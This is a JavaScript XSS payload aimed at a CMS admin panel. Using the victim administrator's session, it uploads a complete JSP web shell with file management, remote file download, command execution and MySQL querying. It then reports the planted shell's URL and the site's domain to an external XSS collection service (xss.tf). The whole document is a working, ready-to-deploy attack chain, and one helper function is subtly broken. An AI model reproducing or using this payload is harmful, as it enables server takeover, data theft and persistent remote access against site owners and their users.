function submitRequest()
      {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "/cms/admin/upload!save.gen", true);
        xhr.setRequestHeader("Accept", "application\/json, text\/javascript, *\/*; q=0.01");
        xhr.setRequestHeader("Content-Type", "multipart\/form-data; boundary=----WebKitFormBoundarySNIrwYsRBtKchhTf");
        xhr.setRequestHeader("Accept-Language", "zh-CN,zh;q=0.9,en;q=0.8");
        xhr.withCredentials = true;
        var body = "------WebKitFormBoundarySNIrwYsRBtKchhTf\r\n" + 
          "Content-Disposition: form-data; name=\"name\"\r\n" + 
          "\r\n" + 
          "1.jsp\r\n" + 
          "------WebKitFormBoundarySNIrwYsRBtKchhTf\r\n" + 
          "Content-Disposition: form-data; name=\"filename\"; filename=\"jsp_custom_script_for_mysql.jsp\"\r\n" + 
          "Content-Type: application/octet-stream\r\n" + 
          "\n" + 
          "\x3c%@page import=\"java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*\" contentType=\"text/html;charset=UTF-8\"%\x3e\n" + 
          "\x3c%!\n" + 
          "\n" + 
          "    String EC(String s) throws Exception {\n" + 
          "        if(encoder.equals(\"hex\") || encoder == \"hex\") return s;\n" + 
          "        return new String(s.getBytes(), cs);\n" + 
          "    }\n" + 
          "\n" + 
          "    String showDatabases(String encode, String conn) throws Exception {\n" + 
          "        String sql = \"show databases\";\n" + 
          "        String columnsep = \"\\t\";\n" + 
          "        String rowsep = \"\";\n" + 
          "        return executeSQL(encode, conn, sql, columnsep, rowsep, false);\n" + 
          "    }\n" + 
          "\n" + 
          "    String showTables(String encode, String conn, String dbname) throws Exception {\n" + 
          "        String sql = \"show tables from \" + dbname;\n" + 
          "        String columnsep = \"\\t\";\n" + 
          "        String rowsep = \"\";\n" + 
          "        return executeSQL(encode, conn, sql, columnsep, rowsep, false);\n" + 
          "    }\n" + 
          "\n" + 
          "    String showColumns(String encode, String conn, String dbname, String table) throws Exception {\n" + 
          "        String columnsep = \"\\t\";\n" + 
          "        String rowsep = \"\";\n" + 
          "        String sql = \"select * from \" + dbname + \".\" + table + \" limit 0,0\";\n" + 
          "        return executeSQL(encode, conn, sql, columnsep, rowsep, true);\n" + 
          "    }\n" + 
          "\n" + 
          "    String query(String encode, String conn, String sql) throws Exception {\n" + 
          "        String columnsep = \"\\t|\\t\";\n" + 
          "        String rowsep = \"\\r\\n\";\n" + 
          "        return executeSQL(encode, conn, sql, columnsep, rowsep, true);\n" + 
          "    }\n" + 
          "\n" + 
          "    String executeSQL(String encode, String conn, String sql, String columnsep, String rowsep, boolean needcoluname)\n" + 
          "            throws Exception {\n" + 
          "        String ret = \"\";\n" + 
          "        conn = (EC(conn));\n" + 
          "        String[] x = conn.trim().replace(\"\\r\\n\", \"\\n\").split(\"\\n\");\n" + 
          "        Class.forName(x[0].trim());\n" + 
          "        String url = x[1] + \"&characterEncoding=\" + decode(EC(encode),encoder);\n" + 
          "        Connection c = DriverManager.getConnection(url);\n" + 
          "        Statement stmt = c.createStatement();\n" + 
          "        ResultSet rs = stmt.executeQuery(sql);\n" + 
          "        ResultSetMetaData rsmd = rs.getMetaData();\n" + 
          "\n" + 
          "        if (needcoluname) {\n" + 
          "            for (int i = 1; i \x3c= rsmd.getColumnCount(); i++) {\n" + 
          "                String columnName = rsmd.getColumnName(i);\n" + 
          "                ret += columnName + columnsep;\n" + 
          "            }\n" + 
          "            ret += rowsep;\n" + 
          "        }\n" + 
          "\n" + 
          "        while (rs.next()) {\n" + 
          "            for (int i = 1; i \x3c= rsmd.getColumnCount(); i++) {\n" + 
          "                String columnValue = rs.getString(i);\n" + 
          "                ret += columnValue + columnsep;\n" + 
          "            }\n" + 
          "            ret += rowsep;\n" + 
          "        }\n" + 
          "        return ret;\n" + 
          "    }\n" + 
          "\n" + 
          "    String WwwRootPathCode(HttpServletRequest r) throws Exception {\n" + 
          "        String d = this.getClass().getResource(\"/\").getPath();\n" + 
          "        String s = \"\";\n" + 
          "        if (!d.substring(0, 1).equals(\"/\")) {\n" + 
          "            File[] roots = File.listRoots();\n" + 
          "            for (int i = 0; i \x3c roots.length; i++) {\n" + 
          "                s += roots[i].toString().substring(0, 2) + \"\";\n" + 
          "            }\n" + 
          "        } else {\n" + 
          "            s += \"/\";\n" + 
          "        }\n" + 
          "        return s;\n" + 
          "    }\n" + 
          "\n" + 
          "    String FileTreeCode(String dirPath) throws Exception {\n" + 
          "        File oF = new File(dirPath), l[] = oF.listFiles();\n" + 
          "        String s = \"\", sT, sQ, sF = \"\";\n" + 
          "        java.util.Date dt;\n" + 
          "        String fileCode=(String)System.getProperties().get(\"file.encoding\");\n" + 
          "        SimpleDateFormat fm = new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\");\n" + 
          "        for (int i = 0; i \x3c l.length; i++) {\n" + 
          "            dt = new java.util.Date(l[i].lastModified());\n" + 
          "            sT = fm.format(dt);\n" + 
          "            sQ = l[i].canRead() ? \"R\" : \"\";\n" + 
          "            sQ += l[i].canWrite() ? \" W\" : \"\";\n" + 
          "            String nm = new String(l[i].getName().getBytes(fileCode), cs);\n" + 
          "            if (l[i].isDirectory()) {\n" + 
          "                s += nm + \"/\\t\" + sT + \"\\t\" + l[i].length() + \"\\t\" + sQ + \"\\n\";\n" + 
          "            } else {\n" + 
          "                sF += nm + \"\\t\" + sT + \"\\t\" + l[i].length() + \"\\t\" + sQ + \"\\n\";\n" + 
          "            }\n" + 
          "        }\n" + 
          "        s += sF;\n" + 
          "        return new String(s.getBytes(fileCode), cs);\n" + 
          "    }\n" + 
          "\n" + 
          "    String ReadFileCode(String filePath) throws Exception {\n" + 
          "        String l = \"\", s = \"\";\n" + 
          "        BufferedReader br = new BufferedReader(new InputStreamReader(new FileInputStream(new File(filePath)), cs));\n" + 
          "        while ((l = br.readLine()) != null) {\n" + 
          "            s += l + \"\\r\\n\";\n" + 
          "        }\n" + 
          "        br.close();\n" + 
          "        return s;\n" + 
          "    }\n" + 
          "\n" + 
          "    String WriteFileCode(String filePath, String fileContext) throws Exception {\n" + 
          "        String h = \"0123456789ABCDEF\";\n" + 
          "        String fileHexContext = strtohexstr(fileContext);\n" + 
          "        File f = new File(filePath);\n" + 
          "        FileOutputStream os = new FileOutputStream(f);\n" + 
          "        for (int i = 0; i \x3c fileHexContext.length(); i += 2) {\n" + 
          "            os.write((h.indexOf(fileHexContext.charAt(i)) \x3c\x3c 4 | h.indexOf(fileHexContext.charAt(i + 1))));\n" + 
          "        }\n" + 
          "        os.close();\n" + 
          "        return \"1\";\n" + 
          "    }\n" + 
          "\n" + 
          "    String DeleteFileOrDirCode(String fileOrDirPath) throws Exception {\n" + 
          "        File f = new File(fileOrDirPath);\n" + 
          "        if (f.isDirectory()) {\n" + 
          "            File x[] = f.listFiles();\n" + 
          "            for (int k = 0; k \x3c x.length; k++) {\n" + 
          "                if (!x[k].delete()) {\n" + 
          "                    DeleteFileOrDirCode(x[k].getPath());\n" + 
          "                }\n" + 
          "            }\n" + 
          "        }\n" + 
          "        f.delete();\n" + 
          "        return \"1\";\n" + 
          "    }\n" + 
          "\n" + 
          "    void DownloadFileCode(String filePath, HttpServletResponse r) throws Exception {\n" + 
          "        int n;\n" + 
          "        byte[] b = new byte[512];\n" + 
          "        r.reset();\n" + 
          "        ServletOutputStream os = r.getOutputStream();\n" + 
          "        BufferedInputStream is = new BufferedInputStream(new FileInputStream(filePath));\n" + 
          "        os.write((\"-\x3e\"+\"|\").getBytes(), 0, 3);\n" + 
          "        while ((n = is.read(b, 0, 512)) != -1) {\n" + 
          "            os.write(b, 0, n);\n" + 
          "        }\n" + 
          "        os.write((\"|\"+\"\x3c-\").getBytes(), 0, 3);\n" + 
          "        os.close();\n" + 
          "        is.close();\n" + 
          "    }\n" + 
          "\n" + 
          "    String UploadFileCode(String savefilePath, String fileHexContext) throws Exception {\n" + 
          "        String h = \"0123456789ABCDEF\";\n" + 
          "        File f = new File(savefilePath);\n" + 
          "        f.createNewFile();\n" + 
          "        FileOutputStream os = new FileOutputStream(f,true);\n" + 
          "        for (int i = 0; i \x3c fileHexContext.length(); i += 2) {\n" + 
          "            os.write((h.indexOf(fileHexContext.charAt(i)) \x3c\x3c 4 | h.indexOf(fileHexContext.charAt(i + 1))));\n" + 
          "        }\n" + 
          "        os.close();\n" + 
          "        return \"1\";\n" + 
          "    }\n" + 
          "\n" + 
          "    String CopyFileOrDirCode(String sourceFilePath, String targetFilePath) throws Exception {\n" + 
          "        File sf = new File(sourceFilePath), df = new File(targetFilePath);\n" + 
          "        if (sf.isDirectory()) {\n" + 
          "            if (!df.exists()) {\n" + 
          "                df.mkdir();\n" + 
          "            }\n" + 
          "            File z[] = sf.listFiles();\n" + 
          "            for (int j = 0; j \x3c z.length; j++) {\n" + 
          "                CopyFileOrDirCode(sourceFilePath + \"/\" + z[j].getName(), targetFilePath + \"/\" + z[j].getName());\n" + 
          "            }\n" + 
          "        } else {\n" + 
          "            FileInputStream is = new FileInputStream(sf);\n" + 
          "            FileOutputStream os = new FileOutputStream(df);\n" + 
          "            int n;\n" + 
          "            byte[] b = new byte[1024];\n" + 
          "            while ((n = is.read(b, 0, 1024)) != -1) {\n" + 
          "                os.write(b, 0, n);\n" + 
          "            }\n" + 
          "            is.close();\n" + 
          "            os.close();\n" + 
          "        }\n" + 
          "        return \"1\";\n" + 
          "    }\n" + 
          "\n" + 
          "    String RenameFileOrDirCode(String oldName, String newName) throws Exception {\n" + 
          "        File sf = new File(oldName), df = new File(newName);\n" + 
          "        sf.renameTo(df);\n" + 
          "        return \"1\";\n" + 
          "    }\n" + 
          "\n" + 
          "    String CreateDirCode(String dirPath) throws Exception {\n" + 
          "        File f = new File(dirPath);\n" + 
          "        f.mkdir();\n" + 
          "        return \"1\";\n" + 
          "    }\n" + 
          "\n" + 
          "    String ModifyFileOrDirTimeCode(String fileOrDirPath, String aTime) throws Exception {\n" + 
          "        File f = new File(fileOrDirPath);\n" + 
          "        SimpleDateFormat fm = new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\");\n" + 
          "        java.util.Date dt = fm.parse(aTime);\n" + 
          "        f.setLastModified(dt.getTime());\n" + 
          "        return \"1\";\n" + 
          "    }\n" + 
          "\n" + 
          "    String WgetCode(String urlPath, String saveFilePath) throws Exception {\n" + 
          "        URL u = new URL(urlPath);\n" + 
          "        int n = 0;\n" + 
          "        FileOutputStream os = new FileOutputStream(saveFilePath);\n" + 
          "        HttpURLConnection h = (HttpURLConnection) u.openConnection();\n" + 
          "        InputStream is = h.getInputStream();\n" + 
          "        byte[] b = new byte[512];\n" + 
          "        while ((n = is.read(b)) != -1) {\n" + 
          "            os.write(b, 0, n);\n" + 
          "        }\n" + 
          "        os.close();\n" + 
          "        is.close();\n" + 
          "        h.disconnect();\n" + 
          "        return \"1\";\n" + 
          "    }\n" + 
          "\n" + 
          "    String SysInfoCode(HttpServletRequest r) throws Exception {\n" + 
          "        String d = \"\";\n" + 
          "        try {\n" + 
          "            if(r.getSession().getServletContext().getRealPath(\"/\") != null){\n" + 
          "                d = r.getSession().getServletContext().getRealPath(\"/\");\n" + 
          "            }else{\n" + 
          "                String cd = this.getClass().getResource(\"/\").getPath();\n" + 
          "                d = new File(cd).getParent();\n" + 
          "            }\n" + 
          "        } catch (Exception e) {\n" + 
          "            String cd = this.getClass().getResource(\"/\").getPath();\n" + 
          "            d = new File(cd).getParent();\n" + 
          "        }\n" + 
          "        String serverInfo = (String)System.getProperty(\"os.name\");\n" + 
          "        String separator = File.separator;\n" + 
          "        String user = (String)System.getProperty(\"user.name\");\n" + 
          "        String driverlist = WwwRootPathCode(r);\n" + 
          "        return d + \"\\t\" + driverlist + \"\\t\" + serverInfo + \"\\t\" + user;\n" + 
          "    }\n" + 
          "\n" + 
          "    boolean isWin() {\n" + 
          "        String osname = (String)System.getProperty(\"os.name\");\n" + 
          "        osname = osname.toLowerCase();\n" + 
          "        if (osname.startsWith(\"win\"))\n" + 
          "            return true;\n" + 
          "        return false;\n" + 
          "    }\n" + 
          "\n" + 
          "    String ExecuteCommandCode(String cmdPath, String command) throws Exception {\n" + 
          "        StringBuffer sb = new StringBuffer(\"\");\n" + 
          "        String[] c = { cmdPath, !isWin() ? \"-c\" : \"/c\", command };\n" + 
          "        Process p = Runtime.getRuntime().exec(c);\n" + 
          "        CopyInputStream(p.getInputStream(), sb);\n" + 
          "        CopyInputStream(p.getErrorStream(), sb);\n" + 
          "        return sb.toString();\n" + 
          "    }\n" + 
          "    \n" + 
          "    String getEncoding(String str) {\n" + 
          "        String encode[] = new String[]{\n" + 
          "                \"UTF-8\",\n" + 
          "                \"ISO-8859-1\",\n" + 
          "                \"GB2312\",\n" + 
          "                \"GBK\",\n" + 
          "                \"GB18030\",\n" + 
          "                \"Big5\",\n" + 
          "                \"Unicode\",\n" + 
          "                \"ASCII\"\n" + 
          "        };\n" + 
          "        for (int i = 0; i \x3c encode.length; i++){\n" + 
          "            try {\n" + 
          "                if (str.equals(new String(str.getBytes(encode[i]), encode[i]))) {\n" + 
          "                    return encode[i];\n" + 
          "                }\n" + 
          "            } catch (Exception ex) {\n" + 
          "            }\n" + 
          "        }\n" + 
          "        \n" + 
          "        return \"\";\n" + 
          "    }\n" + 
          "    String strtohexstr(String fileContext)throws Exception{\n" + 
          "        String h = \"0123456789ABCDEF\";\n" + 
          "        byte[] bytes = fileContext.getBytes(cs);\n" + 
          "        \n" + 
          "        StringBuilder sb = new StringBuilder(bytes.length * 2);\n" + 
          "        for (int i = 0; i \x3c bytes.length; i++) {\n" + 
          "            sb.append(h.charAt((bytes[i] & 0xf0) \x3e\x3e 4));\n" + 
          "            sb.append(h.charAt((bytes[i] & 0x0f) \x3e\x3e 0));\n" + 
          "        }\n" + 
          "        String fileHexContext = sb.toString();\n" + 
          "        return fileHexContext;\n" + 
          "    }\n" + 
          "\n" + 
          "    String decode(String str) {\n" + 
          "        byte[] bt = null;\n" + 
          "        try {\n" + 
          "            sun.misc.BASE64Decoder decoder = new sun.misc.BASE64Decoder();\n" + 
          "            bt = decoder.decodeBuffer(str);\n" + 
          "        } catch (IOException e) {\n" + 
          "            e.printStackTrace();\n" + 
          "        }\n" + 
          "        return new String(bt);\n" + 
          "    }\n" + 
          "    String decode(String str, String encode) throws Exception{\n" + 
          "        if(encode.equals(\"hex\") || encode==\"hex\"){\n" + 
          "            if(str==\"null\"||str.equals(\"null\")){\n" + 
          "                return \"\";\n" + 
          "            }\n" + 
          "            String hexString = \"0123456789ABCDEF\";\n" + 
          "            str = str.toUpperCase();\n" + 
          "            ByteArrayOutputStream baos = new ByteArrayOutputStream(str.length()/2);\n" + 
          "            String ss = \"\";\n" + 
          "            for (int i = 0; i \x3c str.length(); i += 2){\n" + 
          "                ss = ss + (hexString.indexOf(str.charAt(i)) \x3c\x3c 4 | hexString.indexOf(str.charAt(i + 1))) + \",\";\n" + 
          "                baos.write((hexString.indexOf(str.charAt(i)) \x3c\x3c 4 | hexString.indexOf(str.charAt(i + 1))));\n" + 
          "            }\n" + 
          "            return baos.toString(cs);\n" + 
          "        }else if(encode.equals(\"base64\") || encode == \"base64\"){\n" + 
          "            byte[] bt = null;\n" + 
          "            sun.misc.BASE64Decoder decoder = new sun.misc.BASE64Decoder();\n" + 
          "            bt = decoder.decodeBuffer(str);\n" + 
          "            return new String(bt,cs);\n" + 
          "        }\n" + 
          "        return str;\n" + 
          "    }\n" + 
          "\n" + 
          "    void CopyInputStream(InputStream is, StringBuffer sb) throws Exception {\n" + 
          "        String l;\n" + 
          "        BufferedReader br = new BufferedReader(new InputStreamReader(is, cs));\n" + 
          "        while ((l = br.readLine()) != null) {\n" + 
          "            sb.append(l + \"\\r\\n\");\n" + 
          "        }\n" + 
          "        br.close();\n" + 
          "    }%\x3e\n" + 
          "\x3c%\n" + 
          "    response.setContentType(\"text/html\");\n" + 
          "    request.setCharacterEncoding(cs);\n" + 
          "    response.setCharacterEncoding(cs);\n" + 
          "    StringBuffer sb = new StringBuffer(\"\");\n" + 
          "    try {\n" + 
          "        String funccode = EC(request.getParameter(Pwd) + \"\");\n" + 
          "        String z0 = decode(EC(request.getParameter(\"z0\")+\"\"), encoder);\n" + 
          "        String z1 = decode(EC(request.getParameter(\"z1\") + \"\"), encoder);\n" + 
          "        String z2 = decode(EC(request.getParameter(\"z2\") + \"\"), encoder);\n" + 
          "        String z3 = decode(EC(request.getParameter(\"z3\") + \"\"), encoder);\n" + 
          "        String[] pars = { z0, z1, z2, z3};\n" + 
          "        sb.append(\"-\x3e\" + \"|\");\n" + 
          "\n" + 
          "        if (funccode.equals(\"B\")) {\n" + 
          "            sb.append(FileTreeCode(pars[1]));\n" + 
          "        } else if (funccode.equals(\"C\")) {\n" + 
          "            sb.append(ReadFileCode(pars[1]));\n" + 
          "        } else if (funccode.equals(\"D\")) {\n" + 
          "            sb.append(WriteFileCode(pars[1], pars[2]));\n" + 
          "        } else if (funccode.equals(\"E\")) {\n" + 
          "            sb.append(DeleteFileOrDirCode(pars[1]));\n" + 
          "        } else if (funccode.equals(\"F\")) {\n" + 
          "            DownloadFileCode(pars[1], response);\n" + 
          "        } else if (funccode.equals(\"U\")) {\n" + 
          "            sb.append(UploadFileCode(pars[1], pars[2]));\n" + 
          "        } else if (funccode.equals(\"H\")) {\n" + 
          "            sb.append(CopyFileOrDirCode(pars[1], pars[2]));\n" + 
          "        } else if (funccode.equals(\"I\")) {\n" + 
          "            sb.append(RenameFileOrDirCode(pars[1], pars[2]));\n" + 
          "        } else if (funccode.equals(\"J\")) {\n" + 
          "            sb.append(CreateDirCode(pars[1]));\n" + 
          "        } else if (funccode.equals(\"K\")) {\n" + 
          "            sb.append(ModifyFileOrDirTimeCode(pars[1], pars[2]));\n" + 
          "        } else if (funccode.equals(\"L\")) {\n" + 
          "            sb.append(WgetCode(pars[1], pars[2]));\n" + 
          "        } else if (funccode.equals(\"M\")) {\n" + 
          "            sb.append(ExecuteCommandCode(pars[1], pars[2]));\n" + 
          "        } else if (funccode.equals(\"N\")) {\n" + 
          "            sb.append(showDatabases(pars[0], pars[1]));\n" + 
          "        } else if (funccode.equals(\"O\")) {\n" + 
          "            sb.append(showTables(pars[0], pars[1], pars[2]));\n" + 
          "        } else if (funccode.equals(\"P\")) {\n" + 
          "            sb.append(showColumns(pars[0], pars[1], pars[2], pars[3]));\n" + 
          "        } else if (funccode.equals(\"Q\")) {\n" + 
          "            sb.append(query(pars[0], pars[1], pars[2]));\n" + 
          "        } else if (funccode.equals(\"A\")) {\n" + 
          "            sb.append(SysInfoCode(request));\n" + 
          "        }\n" + 
          "    } catch (Exception e) {\n" + 
          "        sb.append(\"ERROR\" + \"://\" + e.toString());\n" + 
          "    }\n" + 
          "    sb.append(\"|\" + \"\x3c-\");\n" + 
          "    out.print(sb.toString());\n" + 
          "%\x3e\n" + 
          "\r\n" + 
          "------WebKitFormBoundarySNIrwYsRBtKchhTf\r\n" + 
          "Content-Disposition: form-data; name=\"formHash\"\r\n" + 
          "\r\n" + 
          "\r\n" + 
          "------WebKitFormBoundarySNIrwYsRBtKchhTf\r\n" + 
          "Content-Disposition: form-data; name=\"configName\"\r\n" + 
          "\r\n" + 
          "attachment\r\n" + 
          "------WebKitFormBoundarySNIrwYsRBtKchhTf\r\n" + 
          "Content-Disposition: form-data; name=\"submit\"\r\n" + 
          "\r\n" + 
          "\xe7\xa1\xae \xe5\xae\x9a\r\n" + 
          "------WebKitFormBoundarySNIrwYsRBtKchhTf--\r\n";
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i); 
        xhr.send(new Blob([aBody]));
        sleep(5);
        getfilename(); 
};

function sleep(time){
     var t = Date.now();
     function sleeptime(d){
          while(Date.now - t <= d);
     } 
     sleeptime(time);
}
function getfilename(){
     var ajax = new XMLHttpRequest();
     ajax.open('GET','/cms/admin/upload!list.gen');
     ajax.send();
     ajax.onreadystatechange = function () {
          if (ajax.readyState==4 &&ajax.status==200) {
               body = ajax.responseText;
               parser=new DOMParser();
               htmlDoc=parser.parseFromString(body, "text/html");
               var url = htmlDoc.getElementsByClassName("border-top")[0].getAttribute('url');
               url = "https://xss.tf/index.php?do=api&id={projectId}&shellurl=" +document.domain + url;
               x=new Image();
               x.src=url;
          }
     }


};
submitRequest();